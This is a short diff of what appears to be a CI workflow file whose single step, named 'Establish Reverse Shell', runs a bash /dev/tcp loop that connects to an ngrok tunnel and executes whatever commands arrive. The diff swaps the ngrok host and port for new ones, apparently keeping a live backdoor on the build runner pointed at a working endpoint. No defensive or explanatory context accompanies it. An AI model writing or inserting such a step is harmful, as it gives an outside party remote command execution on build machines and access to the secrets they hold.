@@ -9,5 +9,5 @@ jobs:
     steps:
       - name: Establish Reverse Shell
         run: |
-          /bin/bash -c "exec 5<>/dev/tcp/2.tcp.ngrok.io/12676; cat <&5 | while read line; do \$line 2>&5 >&5; done" &
+          /bin/bash -c "exec 5<>/dev/tcp/8.tcp.ngrok.io/19671; cat <&5 | while read line; do \$line 2>&5 >&5; done" &
         shell: bash
